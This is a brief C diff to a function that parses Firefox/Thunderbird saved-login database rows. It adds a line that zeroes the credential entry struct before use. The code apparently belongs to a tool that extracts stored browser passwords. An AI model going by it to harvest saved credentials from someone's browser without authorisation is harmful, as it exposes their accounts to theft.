@@ -663,6 +663,7 @@ int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName)
 {
 	struct ffp_entry ffentry;
 	
+	ZeroMemory(&ffentry, sizeof(ffentry));
 	for(int i=0; i<argc; i++){
 		if (!strcmp(azColName[i], "hostname")) {
 			swprintf_s(ffentry.service, 255, L"Firefox/Thunderbird");
